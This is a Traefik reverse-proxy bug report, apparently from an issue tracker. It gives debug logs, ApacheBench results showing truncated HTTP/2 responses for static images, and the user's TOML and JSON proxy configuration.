time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: begin servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: begin servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/static/bootstrap.darkly.min.css","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/css,*/*;q=0.1"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/bootstrap.darkly.min.css","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/css,*/*;q=0.1"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/bootstrap.darkly.min.css","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/css,*/*;q=0.1"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/bootstrap.darkly.min.css","tls":null}"
time="2017-12-31t10:03:35z" level=info msg="vulcand/oxy/forward/http: round trip: code: 200, length: 4982, duration: 300.76998ms tls:version: 303, tls:resume:false, tls:csuite:cca8, tls:server:frontend.redacted.example.com"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/forward: competed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/","tls":null}"
time="2017-12-31t10:03:35z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: competed servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: begin servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/static/header-logo.png","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["*/*"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/header-logo.png","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["*/*"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/header-logo.png","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["*/*"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/header-logo.png","tls":null}"
time="2017-12-31t10:03:36z" level=info msg="vulcand/oxy/forward/http: round trip: code: 200, length: 23808, duration: 438.568051ms tls:version: 303, tls:resume:false, tls:csuite:cca8, tls:server:frontend.redacted.example.com"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["*/*"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/header-logo.png","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/forward: competed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["*/*"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/header-logo.png","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: competed servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/static/header-logo.png","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["*/*"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/header-logo.png","tls":null}"
time="2017-12-31t10:03:36z" level=info msg="vulcand/oxy/forward/http: round trip: code: 200, length: 145196, duration: 762.481688ms tls:version: 303, tls:resume:false, tls:csuite:cca8, tls:server:frontend.redacted.example.com"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/css,*/*;q=0.1"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/bootstrap.darkly.min.css","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/forward: competed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"10.0.1.56:3000","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/css,*/*;q=0.1"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/bootstrap.darkly.min.css","tls":null}"
time="2017-12-31t10:03:36z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: competed servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/static/bootstrap.darkly.min.css","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/css,*/*;q=0.1"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["no-cache"],"cookie":\\["_e5772= "],"dnt":["1"],"pragma":["no-cache"],"referer":[" "],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"frontend.redacted.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"91.64.102.5:51476","requesturi":"/static/bootstrap.darkly.min.css","tls":null}"
the "contentlength": 0 entries seem especially weird
the client definitely receives the correct content length header and the backend sends them correctly as well
</details> ## additional information when inspecting these requests in the browser dev tools, the requests often take longer when they will be incomplete (like twice as long) and still show up as 200 ok
when doing ab benchmarking, the requests take *much* longer and sometimes run into complete timeouts
i assume there is something about http2 that makes ab testing weird?! <details>
small html (3kb) seems to be delivered completely
small percentage of requests are *really slow*.
</summary> ```
$ ab -c 500 -n 10000 -k
this is apachebench, version 2.3 <$revision: 1757674 $>
copyright 1996 adam twiss, zeus technology ltd,
licensed to the apache software foundation, benchmarking frontend.redacted.example.com (be patient)
completed 1000 requests
completed 2000 requests
completed 3000 requests
completed 4000 requests
completed 5000 requests
completed 6000 requests
completed 7000 requests
completed 8000 requests
completed 9000 requests
completed 10000 requests
finished 10000 requests server software:
server hostname: frontend.redacted.example.com
server port: 443
ssl/tls protocol: tlsv1.2,ecdhe-rsa-aes128-gcm-sha256,4096,128
tls server name: frontend.redacted.example.com document path: /
document length: 3101 bytes concurrency level: 500
time taken for tests: 113.501 seconds
complete requests: 10000
failed requests: 0
keep-alive requests: 10000
total transferred: 33480000 bytes
html transferred: 31010000 bytes
requests per second: 88.11 [#/sec] (mean)
time per request: 5675.044 [ms] (mean)
time per request: 11.350 [ms] (mean, across all concurrent requests)
transfer rate: 288.06 [kbytes/sec] received connection times (ms) min mean[+/-sd] median max
connect: 0 492 4357.0 0 67037
processing: 146 3205 1052.5 3019 14069
waiting: 146 3204 1049.0 3019 14069
total: 302 3696 4425.0 3085 72661 percentage of the requests served within a certain time (ms) 50% 3085 66% 3509 75% 3885 80% 4086 90% 4764 95% 5830 98% 7194 99% 13482 100% 72661 (longest request)
``` </details> <details> <summary>small image (7kb) produces about 3-5% responses that do not have the correct size (aka, the image is cut off and only <7kb is transmitted)
small percentage of requests are *really slow*</summary> ```
/home/maritz $ ab -c 200 -n 10000 -k benchmarking frontend.redacted.example.com (be patient)
finished 10000 requests server software:
server hostname: frontend.redacted.example.com
server port: 443
ssl/tls protocol: tlsv1.2,ecdhe-rsa-aes128-gcm-sha256,2048,128 document path: /static/small_image.png
document length: 6948 bytes concurrency level: 200
time taken for tests: 14.823 seconds
complete requests: 10000
failed requests: 369 (connect: 0, receive: 0, length: 369, exceptions: 0)
keep-alive requests: 9631
total transferred: 70720839 bytes
html transferred: 67650839 bytes
requests per second: 674.61 [#/sec] (mean)
time per request: 296.467 [ms] (mean)
time per request: 1.482 [ms] (mean, across all concurrent requests)
transfer rate: 4659.08 [kbytes/sec] received connection times (ms) min mean[+/-sd] median max
connect: 0 91 676.7 0 9558
processing: 35 167 157.1 123 3615
waiting: 34 161 148.6 123 3614
total: 35 258 707.5 125 9847 percentage of the requests served within a certain time (ms) 50% 125 66% 155 75% 189 80% 227 90% 376 95% 579 98% 1213 99% 3770 100% 9847 (longest request)
</details> <details> <summary>medium image (23kb) requires dropping the keep-alive flag and concurrency levels on ab or it doesn't even get to 10 responses most of the time
the responses have >10% length missmatch errors
which makes ab often use the wrong length for the checks.</summary> ```
/home/maritz $ ab -c 50 -n 1000
benchmarking frontend.redacted.example.com (be patient)
finished 1000 requests server software:
server hostname: frontend.redacted.example.com
server port: 443
ssl/tls protocol: tlsv1.2,ecdhe-rsa-aes128-gcm-sha256,4096,128
tls server name: frontend.redacted.example.com document path: /static/medium-image.png
document length: 23808 bytes concurrency level: 50
time taken for tests: 27.427 seconds
complete requests: 1000
failed requests: 125 (connect: 0, receive: 0, length: 125, exceptions: 0)
total transferred: 22237969 bytes
html transferred: 21953969 bytes
requests per second: 36.46 [#/sec] (mean)
time per request: 1371.361 [ms] (mean)
time per request: 27.427 [ms] (mean, across all concurrent requests)
transfer rate: 791.80 [kbytes/sec] received connection times (ms) min mean[+/-sd] median max
connect: 153 812 680.0 733 7895
processing: 66 540 216.5 554 1261
waiting: 34 463 196.3 467 1091
total: 418 1352 708.2 1271 8586 percentage of the requests served within a certain time (ms) 50% 1271 66% 1356 75% 1400 80% 1430 90% 1604 95% 1850 98% 2617 99% 4421 100% 8586 (longest request) ``` </details> for a large .js file (440kb) i couldn't even get any ab run to use the correct content length for it's failure determination
<details> <summary>medium image (23kb) going directly against the backend (no traefik involved) with published port and docker swarm mesh routing.</summary> ```
/home/maritz $ ab -c 50 -n 1000
benchmarking redacted.example.com (be patient)
finished 1000 requests server software:
server hostname: redacted.example.com
server port: 3002 document path: /static/medium-image.png
document length: 23808 bytes concurrency level: 50
time taken for tests: 7.482 seconds
complete requests: 1000
failed requests: 0
total transferred: 24061000 bytes
html transferred: 23808000 bytes
requests per second: 133.66 [#/sec] (mean)
time per request: 374.086 [ms] (mean)
time per request: 7.482 [ms] (mean, across all concurrent requests)
transfer rate: 3140.60 [kbytes/sec] received connection times (ms) min mean[+/-sd] median max
connect: 29 215 696.7 37 7100
processing: 67 116 109.7 81 1764
waiting: 33 67 78.9 40 603
total: 99 331 727.4 119 7442 percentage of the requests served within a certain time (ms) 50% 119 66% 126 75% 143 80% 192 90% 1117 95% 1153 98% 3151 99% 3405 100% 7442 (longest request) ```
</details> i'm in slack if anyone wants me to do some more specific tests or something.
traefik runs itself runs in the docker container
loglevel="error"
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/pki/tls/certs/example1.com.crt" keyfile = "/etc/pki/tls/private/example1.com.key" [[entrypoints.https.tls.certificates]] certfile = "/etc/letsencrypt/live/example2.com.pem" keyfile = "/etc/letsencrypt/live/example2.com/privkey.pem" [web]
address = ":8080"
certfile = "/etc/pki/tls/certs/example1.com.crt"
keyfile = "/etc/pki/tls/private/example1.com.key"
endpoint = "unix:///var/run/docker.sock"
<summary>config json</summary> ```json
{ "lifecycle": null, "gracetimeout": 0, "debug": true, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "loglevel": "debug", "entrypoints": { "http": { "network": "", "address": ":80", "tls": null, "redirect": { "entrypoint": "https" }, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "network": "", "address": ":443", "tls": { "minversion": "versiontls12", "ciphersuites": [ "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_ecdsa_with_aes_256_cbc_sha", "tls_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384", "tls_rsa_with_aes_128_cbc_sha", "tls_rsa_with_aes_256_cbc_sha" ], "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": { "email": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domains": null, "storage": "/etc/traefik/acme/acme.json", "storagefile": "", "ondemand": false, "onhostrule": true, "caserver": "", "entrypoint": "https", "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": true, "tlsconfig": null }, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": { "attempts": 0 }, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "web": { "address": ":8080", "certfile": "", "keyfile": "", "readonly": false, "statistics": null, "metrics": null, "path": "", "auth": null, "debug": false }, "docker": null, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "debugloggeneratedtemplate": false, "directory": "/config/" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": "//traefik.toml"
``` </details> <details>
<summary>traefil.toml</summary> ```toml
debug = true #insecureskipverify = true defaultentrypoints = ["http", "https"] loglevel = "debug" [retry] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_ecdsa_with_aes_256_cbc_sha", "tls_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384", "tls_rsa_with_aes_128_cbc_sha", "tls_rsa_with_aes_256_cbc_sha", ] [acme]
storage = "/etc/traefik/acme/acme.json"
#caserver = " "
email = "some-mail@example.com"
#ondemand = true
onhostrule = true
entrypoint = "https"
acmelogging = true [web] [file]
directory = "/config/"
watch = true
``` /config/services.toml (only file in there)
[frontends] [frontends.concourse] backend = "concourse" [frontends.concourse.routes.test_1] rule = "host:concourse.my.example.com" [backends] [backends.concourse] [backends.concourse.servers.server1] url = " "
</details> ### if applicable, please paste the log output in debug mode (`--debug` switch) <details>
<summary>logs</summary> ```shell
time="2017-12-28t15:26:25z" level=info msg="using toml configuration file //traefik.toml"
time="2017-12-28t15:26:25z" level=warning msg="web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics"
time="2017-12-28t15:26:25z" level=info msg="traefik version v1.5.0-rc3 built on 2017-12-20_02:24:44pm"
time="2017-12-28t15:26:25z" level=info msg="
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data
time="2017-12-28t15:26:25z" level=debug msg="global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":{"entrypoint":"https"},"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"network":"","address":":443","tls":{"minversion":"versiontls12","ciphersuites":["tls_ecdhe_rsa_with_chacha20_poly1305","tls_ecdhe_ecdsa_with_chacha20_poly1305","tls_ecdhe_rsa_with_aes_128_gcm_sha256","tls_ecdhe_rsa_with_aes_256_gcm_sha384","tls_ecdhe_ecdsa_with_aes_128_gcm_sha256","tls_ecdhe_ecdsa_with_aes_256_gcm_sha384","tls_ecdhe_rsa_with_chacha20_poly1305","tls_ecdhe_ecdsa_with_chacha20_poly1305","tls_ecdhe_rsa_with_aes_128_cbc_sha","tls_ecdhe_ecdsa_with_aes_128_cbc_sha","tls_ecdhe_rsa_with_aes_256_cbc_sha","tls_ecdhe_ecdsa_with_aes_256_cbc_sha","tls_rsa_with_aes_128_gcm_sha256","tls_rsa_with_aes_256_gcm_sha384","tls_rsa_with_aes_128_cbc_sha","tls_rsa_with_aes_256_cbc_sha"],"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":{"email":"some-mail@example.com","domains":null,"storage":"/etc/traefik/acme/acme.json","storagefile":"","ondemand":false,"onhostrule":true,"caserver":"","entrypoint":"https","dnsprovider":"","delaydontcheckdns":0,"acmelogging":true,"tlsconfig":null},"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":{"attempts":0},"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"/","auth":null,"debug":false},"docker":null,"file":{"watch":true,"filename":"//traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":"/config/"},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":true,"currentconfigurations":null,"statistics":null,"stats":null,"statsrecorder":null},"metrics":null,"ping":{"entrypoint":"traefik"}}"
